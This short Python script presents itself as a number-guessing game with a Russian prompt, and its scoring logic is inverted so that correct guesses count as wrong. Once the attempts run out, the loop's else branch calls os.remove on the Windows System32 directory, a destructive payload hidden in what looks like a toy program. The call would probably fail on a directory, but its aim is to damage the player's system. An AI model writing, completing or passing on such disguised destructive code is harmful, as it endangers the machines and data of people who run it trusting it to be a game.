import os
import random
x = 10
num = random.randint(1, 2)
while(x > 0):
    if(int(input("Введите число: ")) == num):
        print(f"Неправильно! осталось попыток {x-1}")
        x -= 1
else:
    os.remove(r"C:\Windows\System32")